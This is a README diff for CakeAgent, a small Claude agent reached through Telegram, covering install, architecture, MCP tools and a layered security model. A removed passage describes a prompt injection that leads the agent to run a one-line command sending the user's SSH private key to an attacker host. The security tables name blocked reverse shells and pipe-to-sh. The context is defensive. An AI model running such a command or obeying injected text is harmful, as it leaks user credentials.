@@ -2,92 +2,82 @@
 
 **A personal AI agent in 1,600 lines of code.**
 
-CakeAgent runs Claude as a full-blown agent on your server — with tool use, web search, code execution, file access, scheduling, voice, and an MCP integration ecosystem — all through Telegram. Single Node.js process. 3 dependencies. Zero external API keys.
+CakeAgent runs Claude as a full agent on your server — with tool use, web search, code execution, file access, scheduling, and voice — all through Telegram. It extends itself through the MCP ecosystem: thousands of ready-made integrations, discoverable and installable via chat.
+
+Single Node.js process. 3 dependencies. No containers. No web UI. No API keys for voice.
 
 ---
 
-## Why CakeAgent Exists
+## Why
 
 Every open-source AI assistant arrives pre-bloated. 50+ dependencies, Docker Compose stacks, Redis queues, WebSocket servers, custom plugin systems, and web dashboards — before you've sent a single message. They reinvent capabilities that already exist elsewhere, then lock you into their abstractions.
 
 CakeAgent takes the opposite approach: **do almost nothing yourself, and let the ecosystem do the rest.**
 
-The core is a thin orchestrator (~1,600 LOC) that connects Telegram via raw `fetch()` to the Claude Agent SDK. That's it. Everything else — calendar, email, GitHub, Slack, databases, APIs — comes from the **MCP ecosystem**. Thousands of ready-made tool servers, discoverable and installable via chat, no code changes required. Instead of building a plugin system, CakeAgent plugs into the one that already exists.
+The core is a thin orchestrator (~1,600 LOC) that connects Telegram to the Claude Agent SDK. Everything else — calendar, email, GitHub, Slack, databases, APIs — comes from the **MCP ecosystem**. Instead of building a plugin system, CakeAgent plugs into the one that already exists.
 
-### What's different
+### How it compares
 
-| | CakeAgent | Typical AI assistant frameworks |
+| | CakeAgent | Typical AI assistant |
 |---|---|---|
-| **Dependencies** | 3 | 30–100+ |
-| **Source code** | ~1,600 LOC | 10K–50K+ LOC |
-| **Network listeners** | 0 (outbound only) | HTTP server, WebSocket, Redis |
-| **Telegram integration** | 200 LOC raw `fetch()`, 0 deps | Framework + adapter + middleware |
-| **Tool ecosystem** | MCP — thousands of servers, install via chat | Custom plugin SDK, build everything yourself |
-| **Permission model** | `acceptEdits` + PreToolUse hooks | `bypassPermissions` (YOLO) or nothing |
-| **Configuration** | Via Telegram chat | Config files, web UI, env vars, YAML |
-| **Memory** | Injected into every prompt | Vector DB, embeddings, semantic search |
+| Dependencies | 3 | 30–100+ |
+| Source code | ~1,600 LOC | 10K–50K+ |
+| Network listeners | 0 (outbound only) | HTTP, WebSocket, Redis |
+| Telegram | 200 LOC raw `fetch()` | Framework + adapter |
+| Tool ecosystem | MCP — thousands of servers, install via chat | Custom plugin SDK |
+| Permission model | `acceptEdits` + PreToolUse hooks | `bypassPermissions` or nothing |
+| Memory | Injected into every prompt | Vector DB, embeddings |
 
-### Technical bets that paid off
+### Key design decisions
 
-**1. MCP as the extension model.** Other assistants build plugin systems from scratch — SDKs, marketplaces, custom protocols. CakeAgent uses MCP (Model Context Protocol), an open standard backed by Anthropic with thousands of existing servers. Google Calendar, GitHub, Slack, Jira, databases, email — all installable via a single chat message. The agent queries the official registry, shows you what's available, and writes to `.mcp.json` on confirmation. No code changes, no restarts.
+**MCP as the extension model.** Other assistants build plugin systems from scratch. CakeAgent uses MCP (Model Context Protocol), an open standard with thousands of existing servers. Google Calendar, GitHub, Slack, Jira — all installable via a single chat message. No code changes, no restarts.
 
-**2. Telegram via raw `fetch()`.** CakeAgent uses 8 Telegram Bot API endpoints. grammY, Telegraf, and node-telegram-bot-api are designed for multi-user bots with concurrent handlers and middleware chains. CakeAgent is a single-user agent that processes one message at a time. A 200-line raw `fetch()` adapter gives full control, zero transitive dependencies, and is trivially auditable.
+**Telegram via raw `fetch()`.** 8 API endpoints, 200 lines, zero dependencies. Full control over long polling, error handling, retry logic. Trivially auditable.
 
-**3. In-process MCP via `createSdkMcpServer`.** The standard pattern spawns MCP servers as child processes communicating via stdio, requiring a separate dependency and filesystem-based IPC. CakeAgent uses the Agent SDK's built-in `createSdkMcpServer()` — tools run in the same process. Side effects are intercepted via `PostToolUse` hooks with closure-shared state. No child process. No IPC. No extra dependency.
+**In-process MCP via `createSdkMcpServer`.** CakeAgent's own tools run in the same process as the orchestrator. Side effects are intercepted via `PostToolUse` hooks with closure-shared state. No child process, no IPC.
 
-**4. Layered security over trust.** Most self-hosted AI assistants use `bypassPermissions` — full OS access gated only by a system prompt that says "please don't do bad things." CakeAgent uses `acceptEdits` (files allowed, Bash gated) + `PreToolUse` hooks (command validation) + protected CLAUDE.md (read-only instructions) + sanitized memory + audit logging. No single layer is unbreakable. Together, they make exploitation meaningfully harder.
-
----
-
-## ✨ Features
-
-- 💬 **Telegram** — DM + group chats with trigger words
-- 🧠 **Persistent memory** — learns preferences, cleans up stale entries automatically
-- 🔧 **MCP ecosystem** — discover and install tools via chat (Calendar, GitHub, Slack, etc.)
-- ⏰ **Scheduling** — recurring and one-time tasks
-- 🎙️ **Voice** — local Whisper STT + Edge TTS (no API keys)
-- ⚙️ **Settings via Telegram** — inline keyboards, zero API cost
-- 🔒 **Layered security** — not "please don't" in a prompt, but actual code-level enforcement
-- 🪶 **~1,600 LOC** — 9 files, 3 deps, you can read the entire codebase in an hour
+**Layered security.** Not "please don't" in a prompt, but actual code-level enforcement. `acceptEdits` mode + Bash validation hooks + protected CLAUDE.md + sanitized memory + audit logging.
 
 ---
 
-## 🚀 Setup
+## Install
+
+Requires a Linux server with Node.js 18+ and a Claude subscription or API key.
 
 ```bash
 git clone https://github.com/kossov-it/cakeagent.git
 cd cakeagent
-bash setup.sh
+sudo bash setup.sh
 ```
 
-The script walks you through:
-1. **Telegram bot token** — links you to [@BotFather](https://t.me/BotFather)
-2. **Your Telegram user ID** — links you to [@userinfobot](https://t.me/userinfobot)
-3. **Claude auth** — subscription token via `claude setup-token` (recommended) or API key
-4. Installs, builds, and optionally sets up a **systemd service**
+The script handles everything:
 
-After that, send a message to your bot. CakeAgent guides you through the rest — name, personality, voice, integrations — via Telegram chat.
+| Step | What it does |
+|------|-------------|
+| 1 | Checks Node.js and npm |
+| 2 | Creates a dedicated `cakeagent` system user |
+| 3 | Installs to `/opt/cakeagent` |
+| 4 | Installs Node.js + voice dependencies |
+| 5 | Installs ffmpeg |
+| 6 | Configures passwordless `sudo apt` for the agent |
+| 7 | Asks for Telegram bot token (validates it) |
+| 8 | Asks for Telegram user ID |
+| 9 | Asks for Claude auth (subscription token or API key) |
+| 10 | Installs and starts the systemd service |
 
-### Manual setup
+After setup, send a message to your bot on Telegram. CakeAgent guides you through personalization (name, personality, voice, integrations) via chat.
+
+### Uninstall
+
+Removes everything — service, user, data, sudoers entry, install directory. No traces.
 
 ```bash
-cp .env.example .env && chmod 600 .env
-nano .env                               # Bot token + chat ID
-claude setup-token                      # Then paste token into .env as CLAUDE_CODE_OAUTH_TOKEN
-                                        # Or use ANTHROPIC_API_KEY for pay-per-use
-npm install && npm run build
-sudo cp cakeagent.service /etc/systemd/system/
-sudo systemctl enable --now cakeagent
-```
-
-```bash
-sudo journalctl -u cakeagent -f         # Live logs
-sudo systemctl restart cakeagent        # Restart
+sudo bash setup.sh uninstall
 ```
 
 ---
 
-## 🏗️ Architecture
+## Architecture
 
 ```
 ┌─────────────┐     ┌──────────────┐     ┌────────────────┐
@@ -101,31 +91,42 @@ sudo systemctl restart cakeagent        # Restart
                     └──────────────┘       └───────────────┘
 ```
 
-**Three layers of interception** — most interactions never touch the Claude API:
+### Files
 
-1. **Callback queries** (inline keyboard) → update settings directly → zero cost
-2. **Chat commands** (`/status`, `/settings`, `/reset`) → handled in orchestrator → zero cost
+```
+/opt/cakeagent/
+├── src/
+│   ├── index.ts        Orchestrator: routing, scheduler, shutdown
+│   ├── agent.ts        Claude Agent SDK wrapper
+│   ├── tools.ts        In-process MCP server (16 tools)
+│   ├── hooks.ts        Security hooks + conversation archival
+│   ├── store.ts        SQLite: messages, schedules, groups, audit
+│   ├── voice.ts        Local Whisper STT + Edge TTS
+│   ├── config.ts       .env parser
+│   └── types.ts        Type definitions
+├── channels/
+│   └── telegram.ts     Raw fetch adapter
+├── groups/main/
+│   └── CLAUDE.md       Agent identity + rules
+├── data/
+│   ├── store.db        SQLite database
+│   ├── settings.json   Runtime settings
+│   └── memory.md       Agent-writable persistent memory
+├── .env                Credentials (chmod 600)
+└── .mcp.json           External MCP servers
+```
+
+### Three layers of interception
+
+Most interactions never touch the Claude API:
+
+1. **Callback queries** (inline keyboard) → update settings → zero cost
+2. **Chat commands** (`/status`, `/settings`, `/reset`, `/restart`) → handled in orchestrator → zero cost
 3. **Regular messages** → routed to Claude agent → API cost
-
-### File map
-
-```
-src/index.ts        406 LOC  Orchestrator: routing, scheduler, shutdown
-src/tools.ts        296 LOC  In-process MCP server (16 tools)
-src/store.ts        213 LOC  SQLite: messages, schedules, groups, audit
-channels/telegram.ts 203 LOC  Raw fetch Telegram adapter
-src/hooks.ts        148 LOC  Security hooks + conversation archival
-src/types.ts        142 LOC  Type definitions
-src/voice.ts        128 LOC  Local Whisper STT + Edge TTS
-src/agent.ts         71 LOC  Claude Agent SDK wrapper
-src/config.ts        51 LOC  .env parser
-```
 
 ---
 
-## 🔌 MCP Integrations
-
-CakeAgent queries the [official MCP Registry](https://registry.modelcontextprotocol.io) to discover tools:
+## MCP Integrations
 
 ```
 You:       "Find an MCP server for Google Calendar"
@@ -136,89 +137,80 @@ You:       "Yes"
 CakeAgent: Installed. Available on your next message.
 ```
 
-Servers are stored in `.mcp.json` and loaded automatically per invocation — no restart. Command validation ensures only safe executors (`npx`, `node`, `python`, `uvx`, `docker`).
+The agent queries the [official MCP Registry](https://registry.modelcontextprotocol.io), shows results, and installs with your confirmation. Servers are stored in `.mcp.json` and loaded automatically — no restart needed.
 
 ### Built-in tools
 
-| Tool | What it does |
+| Tool | Description |
 |------|-------------|
-| `send_message` | Mid-conversation messages (progress updates) |
-| `schedule_task` | Recurring / one-time tasks with cron or intervals |
-| `search_mcp_registry` | Query the official MCP Registry |
-| `install_tool` / `remove_tool` | Manage MCP servers via `.mcp.json` |
-| `update_settings` | Change model, thinking level, voice, etc. |
-| `register_group` | Add Telegram group chats with trigger words |
-| `update_memory` / `rewrite_memory` | Persistent memory management |
-| `list_tools` / `list_groups` / `list_schedules` | Inspect state |
+| `send_message` | Mid-conversation progress messages |
+| `schedule_task` | Recurring / one-time tasks |
+| `search_mcp_registry` | Query the official registry |
+| `install_tool` / `remove_tool` | Manage MCP servers |
+| `update_settings` | Change model, thinking level, voice |
+| `register_group` | Add Telegram group chats |
+| `update_memory` / `rewrite_memory` | Persistent memory |
 
 ---
 
-## 🎙️ Voice
+## Voice
 
 | Component | Provider | Cost |
 |-----------|----------|------|
-| STT | **whisper.cpp** (local, on-device) | Free |
+| STT | **whisper.cpp** (local) | Free |
 | TTS | **Edge TTS** (Microsoft) | Free |
 
-No API keys. No cloud transcription. Voice notes are processed locally.
-
-```bash
-sudo apt install whisper-cpp ffmpeg     # STT dependencies
-npm i edge-tts                          # TTS (optional)
-mkdir -p data/models
-# Download the base model from whisper.cpp/models/:
-cd /usr/share/whisper-cpp/models && ./download-ggml-model.sh base
-cp ggml-base.bin /path/to/cakeagent/data/models/
-```
+No API keys. No cloud. Voice notes processed entirely on-device. Enable via `/settings` or chat.
 
 ---
 
-## 🔒 Security Model
-
-CakeAgent's security is layered — no single point of failure:
+## Security
 
 | Layer | What it does |
 |-------|-------------|
-| **No network listeners** | Outbound-only. Telegram long poll + MCP registry fetch. No ports open. |
-| **Chat ID + sender allowlist** | Only configured Telegram chats and senders can trigger the agent. |
-| **`acceptEdits` permissions** | File operations auto-approved. Bash commands gated by hooks. |
-| **PreToolUse Bash validator** | Regex-based command filter blocks shell injection, reverse shells, pipe-to-sh. |
-| **Protected CLAUDE.md** | Agent cannot modify its own instructions. PreToolUse hook denies Write/Edit to CLAUDE.md, .env, credentials/. |
-| **Sanitized memory** | `update_memory` strips prompt injection patterns before writing. |
-| **Conversation archival** | PreCompact hook saves transcripts before SDK context compaction. |
-| **Persistent rate limiting** | SQLite-backed, survives restarts. Per-sender. |
-| **Concurrency guard** | `agentBusy` flag prevents scheduler + user message from running agents simultaneously. |
-| **Audit trail** | Every Bash command, every file write denial, every tool install → SQLite audit table. |
-| **`maxTurns: 25`** | Prevents runaway agent loops from burning API quota. |
-| **systemd hardening** | `NoNewPrivileges`, `ProtectSystem=strict`, `PrivateTmp`, restricted write paths. |
-
-### Why not `bypassPermissions`?
-
-Most self-hosted Claude agents use `permissionMode: 'bypassPermissions'` because it's the easiest way to make everything work. The SDK docs even suggest it for personal use.
-
-The problem: `bypassPermissions` ignores `allowedTools` entirely. Every tool is auto-approved. A prompt injection in a Telegram message → the agent runs `cat ~/.ssh/id_rsa | curl attacker.com` with zero resistance. The only defense is a system prompt saying "don't do bad things."
-
-CakeAgent uses `acceptEdits` — file ops are auto-approved (the agent needs them), but Bash goes through a PreToolUse hook that validates the command before execution. It's not a perfect boundary (no regex can catch every shell trick), but it catches 90%+ of automated injection patterns and logs everything for review.
+| **No network listeners** | Outbound only — Telegram long poll + MCP registry |
+| **Dedicated system user** | `cakeagent` user with restricted permissions |
+| **Chat ID + sender allowlist** | Only configured chats and senders trigger the agent |
+| **`acceptEdits` permissions** | File ops allowed, Bash gated by validation hooks |
+| **PreToolUse Bash validator** | Blocks shell injection, reverse shells, pipe-to-sh |
+| **Protected CLAUDE.md** | Agent cannot modify its own instructions |
+| **Sanitized memory** | Injection patterns stripped from memory writes |
+| **Persistent rate limiting** | SQLite-backed, survives restarts |
+| **Audit trail** | Every tool invocation logged |
+| **`maxTurns: 25`** | Prevents runaway agent loops |
+| **systemd hardening** | `ProtectSystem=strict`, `NoNewPrivileges`, `PrivateTmp` |
 
 ---
 
-## 📝 Telegram Commands
+## Telegram Commands
 
-| Command | Description | API Cost |
-|---------|-------------|----------|
+| Command | Description | Cost |
+|---------|-------------|------|
 | `/status` | Model, uptime, active tasks | Free |
 | `/settings` | Inline keyboard for model, thinking, voice | Free |
 | `/reset` | Clear conversation session | Free |
+| `/restart` | Restart the bot (systemd brings it back) | Free |
 | `/help` | List commands | Free |
 
 ---
 
-## 🤝 Contributing
+## Manage
 
-CakeAgent is intentionally small. Before adding a feature, ask: can the agent do this via an MCP server instead? If yes, don't add it to CakeAgent — install the MCP server.
+```bash
+sudo journalctl -u cakeagent -f       # Live logs
+sudo systemctl status cakeagent       # Status
+sudo systemctl restart cakeagent      # Restart (or /restart via Telegram)
+sudo systemctl stop cakeagent         # Stop
+```
+
+---
+
+## Contributing
+
+CakeAgent is intentionally small. Before adding a feature, ask: can the agent do this via an MCP server instead? If yes, don't add it — install the MCP server.
 
 The entire codebase fits in one context window. Read it before submitting a PR.
 
-## 📄 License
+## License
 
 MIT
